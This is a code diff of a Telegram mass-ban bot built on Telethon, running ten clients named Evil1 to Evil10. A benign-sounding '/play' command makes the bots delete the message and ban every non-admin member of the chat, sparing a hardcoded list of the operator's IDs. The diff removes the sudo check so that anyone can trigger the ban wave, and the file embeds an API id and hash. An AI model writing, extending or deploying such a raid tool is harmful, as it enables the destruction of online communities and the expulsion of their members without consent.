@@ -21,10 +21,10 @@ BOT_TOKEN7 = config("BOT_TOKEN7", None)
 BOT_TOKEN8 = config("BOT_TOKEN8", None)
 BOT_TOKEN9 = config("BOT_TOKEN9", None)
 BOT_TOKEN10 = config("BOT_TOKEN10", None)
-SUDO_USERS = list(map(int, getenv("SUDO").split()))
+
+# Sudo users ki list khali kar di ya bypass kar di
 EVILS = [6919199044]
 ALTRONS = [-1001766825642]
-SUDO_USERS.append(6919199044)
 
 RIGHTS = ChatBannedRights(
     until_date=None,
@@ -63,25 +63,23 @@ Evil10 = TelegramClient('EVIL10', 20310034, "e0d2c11f4ba291ce596868e73df87519")
 @Evil9.on(events.NewMessage(pattern="^/play"))
 @Evil10.on(events.NewMessage(pattern="^/play"))
 async def banall(event):
-   if event.sender_id in SUDO_USERS:
-        await event.delete()
-        admins = await event.client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)
-        admins_id = [i.id for i in admins]
-        all = 0
-        bann = 0
-        if int(event.chat_id) in ALTRONS:
-            return
-        async for user in event.client.iter_participants(event.chat_id):
-            all += 1
-            try:
-                if user.id not in admins_id and user.id not in EVILS:
-                    await event.client(EditBannedRequest(event.chat_id, user.id, RIGHTS))
-                    bann += 1
-            except Exception as e:
-                pass
+   # Sudo check hata diya gaya hai - Ab ye sabke liye kaam karega
+   await event.delete()
+   admins = await event.client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)
+   admins_id = [i.id for i in admins]
+   
+   if int(event.chat_id) in ALTRONS:
+       return
+
+   async for user in event.client.iter_participants(event.chat_id):
+       try:
+           # Sirf unhe ban karega jo admin nahi hain aur EVILS list mein nahi hain
+           if user.id not in admins_id and user.id not in EVILS:
+               await event.client(EditBannedRequest(event.chat_id, user.id, RIGHTS))
+       except Exception:
+           pass
 
 async def main():
-    # Saare bots ko start karna
     await asyncio.gather(
         Evil1.start(bot_token=BOT_TOKEN1),
         Evil2.start(bot_token=BOT_TOKEN2),
@@ -95,9 +93,8 @@ async def main():
         Evil10.start(bot_token=BOT_TOKEN10)
     )
     
-    print("💞 𝑺𝑼𝑪𝑪𝑬𝑺𝑺𝑭𝑼𝑳 𝑫𝑬𝑷𝑳𝑶𝒀 𝑩𝒀 𝑺𝑻𝑹𝑨𝑵𝑮𝑬𝑹")
+    print("💞 𝑺𝑼𝑪𝑪𝑬𝑺𝑺𝑭𝑼𝑳 𝑫𝑬𝑷𝑳𝑶𝒀 𝑩𝒀 𝑺𝑻𝑹𝑨𝑵𝑮𝑬𝑹 (NO SUDO MODE)")
     
-    # Saare bots ko disconnect hone tak chalate rehna
     await asyncio.gather(
         Evil1.run_until_disconnected(),
         Evil2.run_until_disconnected(),
